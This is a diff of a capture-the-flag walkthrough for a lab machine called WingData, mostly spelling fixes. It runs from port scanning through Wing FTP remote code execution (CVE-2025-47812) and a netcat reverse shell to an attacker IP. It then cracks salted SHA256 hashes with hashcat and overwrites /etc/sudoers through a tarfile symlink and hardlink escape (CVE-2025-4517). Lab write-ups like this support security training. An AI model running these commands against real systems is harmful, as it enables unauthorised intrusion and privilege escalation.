@@ -2,7 +2,7 @@
 
 ## Recon
 
-- I started with a quick all port scan with rustscan
+- I started with a quick all-port scan using RustScan
 ```
  rustscan -a 10.129.2.140 -r 1-65535 --ulimit 5000
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -21,7 +21,7 @@ I scanned ports so fast, even my computer was surprised.
 Open 10.129.2.140:22
 Open 10.129.2.140:80
 ```
-- found two openports lets performa nmap scan with options **-A** 
+- found two open ports, let's performe nmap scan with option **-A** 
 
 ```
 nmap -A -p22,80 10.129.2.140 -oN nmap_scan
@@ -54,36 +54,36 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 22.38 seconds
 ```
-- web service running on port 80 lets see what it is . In the mean time i would like to perform a allport scan and a udp scan using nmap_scan.
+- A web service running on port 80 lets see what it is. In the mean time i would like to perform an allport TCP scan and a UDP scan using nmap.
 ![screeshot](Data/Wingdata1.png)
-- We cn see the domain wingdata.htb lets add it to our /etc/hosts file
+- We can see the domain, wingdata.htb. let's add it to our /etc/hosts file
 
 ```
 echo "10.129.2.140 wingdata.htb" | sudo tee -a /etc/hosts 
 ```
-- Web app enumeation
+- Web app enumeration
 ![screenshot](Data/Wingdta2.png)
-- The client portal in the above screenshot redirecting us to another url "http://ftp.wingdata.htb/"
-- lets add this ftp domain to our /etc/hosts  file. 
-- now visit the url . we are redirected to a login page. The site running a wing ftp server . you can even find the version 
+- The client portal in the above screenshot is redirecting us to another url "http://ftp.wingdata.htb/"
+- Let's add this ftp domain to our /etc/hosts  file. 
+- Now visit the url. We can see a login page. The site is running a wing ftp server. The version was disclosed.
 ```
 Wing FTP Server v7.4.3
 ```
 - Wing FTP Server is a free, easy-to-use, and secure FTP server software for Windows, Linux, and Mac OS
-- The folloeing version is vulnerable to [CVE-2025-47812](https://www.sonicwall.com/blog/wing-ftp-server-remote-code-execution-cve-2025-47812). 
-- which is a Unautenticated remote code execution  via username perameter. 
+- The following version is vulnerable to [CVE-2025-47812](https://www.sonicwall.com/blog/wing-ftp-server-remote-code-execution-cve-2025-47812). 
+- which is a Unautenticated remote code execution  via the username parameter. 
 - **Flow of the vulnerability**
 	- The above version relies on **strlen()** function from **C** to validates username. 
 	- The function is vulnerable to **NULL-Byte** trucation(means treat null byte(%00) as end of a string). 
-	- So any data after the null byte will be ignored. **username=admin%00ignores_anything**
-	- So if we able to succefully authenticate to the server it create a **SESSION** variable which is written to a file .
-	- The session file include the full username and it handles by **Lau** Scripting language.
-	- paylaod: **username=admin%00lau_code.
-	- So visting any authenticated page could execute the **lau code** leads to an **RCE**.
+	- So any data after the null byte will be ignored. **username=admin%00ignores_anything**, so any data after the null byte will reach the server.
+	- So if we can successfully authenticate to the server, it creates a **SESSION DOCUMENT**, which contains a username variable.
+	- The session file includes the full username, and it is handled by the **Lau** Scripting language. All we need to do is escape the variable to execute our lau code
+	- payload: **username=admin%00lau_code**
+	- So visiting any authenticated page could execute the **lau code** leads to an **RCE**.
 
-- you can find POC python script on [exploitDB](https://www.exploit-db.com/exploits/52347)
-- In oder for attack to success we need a valid creds . wing ftp has **anonymous login** lets try it.
-- Downlaod the script. 
+- You can find the POC Python script on [exploitDB](https://www.exploit-db.com/exploits/52347)
+- To make the attack success we need valid credentials. wing ftp has **anonymous login** lets try it.
+- Download the script. 
 ```
  python3 Wingftp_RCE.py -u "http://ftp.wingdata.htb" -U anonymous -c whoami
 
@@ -96,7 +96,7 @@ Wing FTP Server v7.4.3
 wingftp
 ----------------------
 ```
-- We got commadn execution lets use to get a revshell.
+- We got command execution lets use it to get a revshell.
 ```
 python3 Wingftp_RCE.py -u "http://ftp.wingdata.htb" -U anonymous -c "nc 10.10.14.161 3333 -e /bin/bash"
 
@@ -105,7 +105,7 @@ python3 Wingftp_RCE.py -u "http://ftp.wingdata.htb" -U anonymous -c "nc 10.10.14
 [+] UID extracted: ae79a8cbbff0c1e2d56ac349ac0db91af528764d624db129b32c21fbca0cb8d6
 [+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: ae79a8cbbff0c1e2d56ac349ac0db91af528764d624db129b32c21fbca0cb8d6
 ```
-- Start you listener . and we got the shell .
+- Start your listener. And we got the shell.
 ```
 nc -lnvp 3333
 listening on [any] 3333 ...
@@ -113,10 +113,10 @@ connect to [10.10.14.161] from (UNKNOWN) [10.129.2.140] 47308
 id
 uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
 ```
-- Stabulize the revshell
+- Stabilizing revshell
 ![screenshot](Data/Wingdata3.png)
 
-## privilage escalation 
+## privilege escalation 
 
 ```
 cat /etc/passwd
@@ -146,13 +146,13 @@ wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
 wacky:x:1001:1001::/home/wacky:/bin/bash
 _laurel:x:999:996::/var/log/laurel:/bin/false
 ```
-- We can see 3 user with shell.**wingftp,wacky,root**
-- Inside **/opt/wftpserver/Data/1/users** we can find xml files for each user. 
+- We can see 3 users with a shell.**wingftp, wacky, root**
+- Inside **/opt/wftpserver/Data/1/users** we can find XML files for each user account for the ftp server. 
 ```
 wingftp@wingdata:/opt/wftpserver/Data/1/users$ ls
 anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
 ```
-- Every file contians password hashes.
+- Every file contains password hashes.
 ```
 wingftp@wingdata:/opt/wftpserver/Data/1/users$ grep -r "<Password>"
 maria.xml:        <Password>a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03</Password>
@@ -161,8 +161,8 @@ wacky.xml:        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b878
 anonymous.xml:        <Password>d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca</Password>
 john.xml:        <Password>c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10</Password>
 ```
-- The hashes seems to sha256 lets try to crack the password hashes. 
-- On enumerating other directories, directory path **/opt/wftpserver/lua** contains the **ServerInterface.lua** . this file reveals how the hases are generated from the password
+- The hashes seem to be sha256 lets try to crack the password hashes. 
+- On enumerating other directories, In directory path **/opt/wftpserver/lua** contains the **ServerInterface.lua** . This file reveals how the hashes are generated from the password
 
 ```
 if c_GetOptionInt(domain, DOPTION_ENABLE_PASS_SALTING) == 1 then
@@ -175,20 +175,20 @@ if c_GetOptionInt(domain, DOPTION_ENABLE_SHA256) == 1 then
 end
 ```
 - **Hash= SHA256(password + salt)**
-- now we need to find the salt string.
+- Now we need to find the salt string.
 - Inside **/opt/wftpserver/Data/1/settings.xml** we can find the salt_string.
 ```
 wingftp@wingdata:/opt/wftpserver/Data/1$ cat settings.xml | grep -i "salt"
     <EnablePasswordSalting>1</EnablePasswordSalting>
     <SaltingString>WingFTP</SaltingString>
 ```
-- now we know the salt and how the password hases are generated . so inorder to crack the hash. we need to append **WingFTP** to each password . 
+- Now we know the salt and how the password hashes are generated.  To crack the hash. We need to append **WingFTP** to each password before converting it to a hash. 
 - For that i am going to write a hashcat rule
 ```
 $W$i$n$g$F$T$P
 ```
 - In hashcat rule syntax **$x** means append x to the password.
-- save the rule to a file, i saved it as wing.rule 
+- Save the rule to a file. I saved it as wing.rule 
 ```
 hashcat -m 1400 -a 0 hash_wacky.txt /usr/share/wordlists/rockyou.txt -r wing.rule
 hashcat (v7.1.2) starting
@@ -269,7 +269,7 @@ Stopped: Sun Feb 15 16:54:47 2026
 - We got wacky user password "!#7Blushing^*Bride5"
 ***Note:Hashcat given "!#7Blushing^*Bride5WingFTP" as password but the orginal password is "!#7Blushing^*Bride5" because our wing.rule appends WingFTP to the password***
 
-- ssh as wacky wit the above password
+- ssh as user wacky with the above password
 ```
 wacky@wingdata:~$ cat user.txt 
 e19d76d50356bfb3fda6222a0818e493
@@ -287,7 +287,7 @@ User wacky may run the following commands on wingdata:
     (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
 
 ```
-- We can run a python script as root without password. let see what the script is about
+- We can run the above Python script as root without a password. Let's see what the script is about
 ```
 #!/usr/bin/env python3
 import tarfile
@@ -368,35 +368,47 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-- Simply put, the script takes two arguments -b backup file name must follow a format (like backup_1.tar)
-- -r restore directory name . name shoud be start with restore_ 
-- The code bug exisits in **tar.extractall(path=staging_dir, filter="data")**
-- I found that the **filter="data"** is actually used to prevent form path traversal, symlinks , device files etc.. but it failed to prevent. 
+- Simply put, the script takes two arguments -b backup file name must follow a format (like backup_< integer>.tar)
+- -r restore directory name. name should start with restore_ 
+- The bug exisits in **tar.extractall(path=staging_dir, filter="data")**
+- I found that the **filter="data"** is actually used to prevent form any path traversal, symlinks, device files, etc., but it failed to prevent. 
 - **CVE-2025-4517/CVE-2025-4330**  path traversal and arbitrary file write.
-- On doing some reasearch found that we can trick the the filter  to write our content to any file we want by using symilinks and hardlinks.
+- After some reasearch I found that we can trick the filter to write our content to any file we want by using symlinks and hardlinks.
 - I found a python poc script to exploit this [CVE-2025-4517](https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData/blob/main/CVE-2025-4517-POC.py)
 
 
-- I will simply explain the workflow here . 
+- I will simply explain the workflow here. 
 
-- **need to exsaust the filter so it skip checking the path**
-    - Creats a big directory name of lenght 156 in this case.
-    - inside the directory[b*256] crete a symlink with name as "a" and it is pointing to the bigdirectory name.
-    - inside bug directory we it creates another drectory with the same name as the big directory[b*156] inside this creats a symlinke b pointing to the big directory name.
-    - The script has repeated the rocess up to 16 levels .
-    - as it become so much work for the filter it skip filtering.
-- **escaping**
-    - now we have 16 directoried . in the bottom directory we create symlink escape point to (../*16)/etc . 
-    - We performing 16 backtracking so we can escape our entire directries and finally get /etc
-    - which menas when extracted the escape symlink points to /etc
-- **file overwrite**
-    - Now we place a hardlink sudoers_link on **root** of the directory pointing to escape/sudoers
-    - as our escape symlink pointing to /etc 
-    - the final will become /etc/sudoers
-    - in the root of the firectory we create another test file with smae name sudoers_link and add our content to it. **wacky ALL=(ALL) NOPASSWD: ALL**
-    - So we alredy have the hardlink with the same name so it simply rewrite the harlink which is pointing to the /etc/sudoers file .
+- **Exhaust the filter so it skips validating the path properly**
+	- First, we create a directory with a very long name — in this case, 256 characters long (e.g., b * 256).
+	- Inside this directory, we create a symlink named a that points back to the large directory name
+	- Inside the large directory, we create another directory with the same long name. Within this new directory, we create another symlink b that again points to the large directory.
+	- This process is repeated up to 16 nested levels.
+	- Because of the deep nesting and repeated resolution work, the filter becomes overloaded and eventually skips proper path validation
+- **Escaping the Directory**
+    - At this point, we have 16 nested directories.
+	- In the deepest directory, we create a symlink named escape that points to
+    ```
+    ../../../../../../../../../../../../etc
+	```
+    (i.e., ../ repeated 16 times, followed by /etc)
+    - By backtracking 16 levels, we escape all our nested directories and reach /etc.
+    - This means that when the archive is extracted, the escape symlink effectively resolves to /etc
+- **File Overwrite via Hardlink**
+    - Next, we place a hardlink named sudoers_link in the root of the archive directory.
+    - This hardlink points to escape/sudoers.
+    - Since escape resolves to /etc, the final resolved path becomes:
+      ```
+      /etc/sudoers
 
-- copy paste the python code to the attack box 
+      ```
+    - We then create another file in the root directory with the same name (sudoers_link) and insert our malicious content:
+      ```
+      wacky ALL=(ALL) NOPASSWD: ALL
+	  ```
+    - Because the hardlink already points to /etc/sudoers, writing to sudoers_link effectively overwrites /etc/sudoers
+
+- Copy-paste the Python code to the attack box 
 [screetnshot](Data/Wingdata4.png)
 
 ```
@@ -435,7 +447,7 @@ if __name__ == "__main__":
 
 [?] Spawn root shell now? (y/n): n
 ```
-- The above command generated a tar file . cp it to the backups directory 
+- The above command generated a malicious tar file. Copy it to the backups directory and rename it. 
 
 ```
 cp /tmp/cve_2025_4517_exploit.tar /opt/backup_clients/backups/backup_9999.tar
@@ -446,12 +458,12 @@ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
   -b backup_9999.tar \
   -r restore_exploit
 ```
-- lets check sudoers contetnt
+- Now check the sudoers content
 ```
 cat /etc/sudoers
 wacky ALL=(ALL) NOPASSWD: ALL
 ```
-- We successfully overwrite sudoers files 
+- We successfully overwrote the sudoers files 
 - lets get root access
 ```
 sudo su
